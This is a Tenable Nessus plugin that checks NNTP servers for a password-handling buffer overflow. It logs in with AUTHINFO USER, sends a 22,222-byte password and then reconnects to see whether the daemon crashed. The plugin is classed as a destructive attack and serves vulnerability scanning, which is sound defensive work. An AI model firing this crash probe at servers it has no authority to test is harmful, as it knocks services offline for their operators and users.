#
# (C) Tenable Network Security, Inc.
#

# Overflow on the user name is tested by cassandra_nntp_dos.nasl
#
# NNTP protocol is defined by RFC 977
# NNTP message format is defined by RFC 1036 (obsoletes 850); see also RFC 822.

include( 'compat.inc' );

if(description)
{
  script_id(17229);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2017/03/21 03:23:57 $");

  script_name(english:"NNTP Server Password Handling Remote Overflow");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to a buffer overflow.'
  );

  script_set_attribute(
    attribute:'description',
    value:"Nessus was able to crash the remote NNTP server by sending
a too long password.

This flaw is probably a buffer overflow and might be exploitable
to run arbitrary code on this machine."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Apply the latest patches from your vendor or use different software."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");


 script_set_attribute(attribute:"plugin_publication_date", value: "2005/02/28");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_summary(english:"Sends long password to nntpd");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005-2017 Tenable Network Security, Inc.");
  script_family(english:"Gain a shell remotely");
  script_dependencie("find_service_3digits.nasl", "nntp_info.nasl");
  script_require_ports("Services/nntp", 119);
  exit(0);
}

#
include('global_settings.inc');
include('nntp_func.inc');

port = get_kb_item("Services/nntp");
if(!port) port = 119;
if(! get_port_state(port)) exit(0);

user = get_kb_item("nntp/login");
# pass = get_kb_item("nntp/password");

ready = get_kb_item("nntp/"+port+"/ready");
if (! ready) exit(0);

# noauth = get_kb_item("nntp/"+port+"/noauth");
# posting = get_kb_item("nntp/"+port+"/posting");

s = open_sock_tcp(port);
if(! s) exit(0);

line = recv_line(socket: s, length: 2048);

if (! user) user = "nessus";

send(socket:s, data: strcat('AUTHINFO USER ', user, '\r\n'));
buff = recv_line(socket:s, length:2048);
send(socket:s, data: strcat(crap(22222), '\r\n'));
buff = recv_line(socket:s, length:2048);
close(s);
sleep(1);

s = open_sock_tcp(port);
if(! s)
{
  security_hole(port);
  exit(0);
}
else
 close(s);

if (report_paranoia > 1 && ! buff)
security_hole(port: port, extra:
"The remote NNTP daemon abruptly closes the connection
when it receives a too long password.
It might be vulnerable to an exploitable buffer overflow;
so an attacker might run arbitrary code on this machine.

*** Note that Nessus did not crash the service, so this
*** might be a false positive.
*** However, if the NNTP service is run through inetd
*** it is impossible to reliably test this kind of flaw.");
